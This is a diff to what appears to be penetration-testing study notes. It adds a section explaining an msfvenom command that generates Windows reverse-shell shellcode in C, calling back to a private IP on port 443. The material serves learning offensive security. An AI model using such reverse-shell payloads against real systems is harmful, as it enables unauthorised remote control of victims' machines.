@@ -193,6 +193,18 @@ Framework Payloads (968 total) [--payload <value>]
 
 #### Generating Code with Metasploit
 
+The command structure is:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.174 LPORT=443 -f c
+```
+{% endcode %}
+
+* `-f c` outputs the shellcode for the C language (`-f raw` can be used to just get the shellcode)
+
+When run the shellcode is output as follows:
+
 ```shell-session
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.174 LPORT=443 -f c
 
